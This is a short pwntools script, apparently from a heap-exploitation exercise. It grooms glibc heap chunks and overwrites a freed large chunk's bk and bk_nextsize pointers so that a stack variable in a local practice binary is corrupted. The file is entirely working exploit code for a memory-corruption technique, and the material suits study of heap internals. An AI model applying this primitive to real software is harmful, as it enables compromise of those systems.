from pwn import *
from handle import *

def exploit():
	malloc(0x400)
	A_index = 0
	malloc(0x10)
	malloc(0x500)
	B_index = 2
	malloc(0x10)
	malloc(0x500)
	C_index = 4
	malloc(0x10)

	free_chunk(A_index)
	free_chunk(B_index)

	malloc(0x100)
	D_index = 6

	free_chunk(C_index)

	target = stack_var_1_address()
	write_to_chunk(1, '\x00' * 0x18 + p64(0x4f0) + p64(0) + p64(target - 0x10) + p64(0) + p64(target - 0x20))

	malloc(0x100)

	
p = exec_file(1)
exploit()
p.interactive()
p.close()
